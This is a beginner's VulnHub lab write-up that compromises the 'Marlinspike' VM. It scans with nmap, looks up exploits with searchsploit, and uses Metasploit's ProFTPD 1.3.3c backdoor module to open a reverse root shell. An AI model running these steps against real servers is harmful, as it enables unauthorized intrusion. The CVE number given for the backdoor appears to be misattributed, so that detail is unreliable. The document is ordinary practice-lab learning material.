# Marlinspike — VulnHub Writeup

**Difficulty:** Beginner  
**Machine:** Marlinspike (VulnHub)  
**Date:** March 2025  
**Target IP:** 192.168.x.x  

---

## Summary

First VulnHub machine. Exploited a known backdoor in ProFTPD 1.3.3c using Metasploit to get a root shell directly — no privilege escalation required.

---

## Tools Used

- Nmap
- Searchsploit
- Metasploit Framework

---

## Step 1 — Host Discovery & Nmap Scan

```bash
nmap -sC -sV -p- 192.168.x.x
```

**Key findings:**

```
21/tcp  open  ftp     ProFTPD 1.3.3c
22/tcp  open  ssh     OpenSSH 5.3p1
```

ProFTPD 1.3.3c on port 21 stood out immediately — old version, worth checking for known exploits.

---

## Step 2 — Searchsploit

```bash
searchsploit ProFTPD 1.3.3
```

**Output:**

```
ProFTPD 1.3.3c - Backdoor Command Execution   | unix/remote/15662.rb
```

Confirmed backdoor vulnerability. This is exploitable via Metasploit directly.

> **CVE:** CVE-2010-4221 — A backdoor was introduced into ProFTPD 1.3.3c source code, allowing unauthenticated remote command execution.

---

## Step 3 — Exploitation via Metasploit

```bash
msfconsole

use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.168.x.x
set LHOST 192.168.x.x
run
```

**Result:**

```
[*] Started reverse TCP handler on 192.168.x.x:4444
[*] 192.168.x.x:21 - Connecting to FTP server...
[+] 192.168.x.x:21 - Backdoor service has been spawned, handling...
[*] Command shell session 1 opened
```

Got a root shell directly — no privilege escalation needed.

---

## Step 4 — Proof

```bash
whoami
# root

cat /root/proof.txt
# (flag here)
```

---

## Key Takeaways

- Always check service versions carefully during Nmap — version info is everything
- Searchsploit is the first stop after finding an unusual or outdated service version
- Some old services carry backdoors that give root straight away — know your CVEs
- This was my first VulnHub machine and set the foundation for everything after
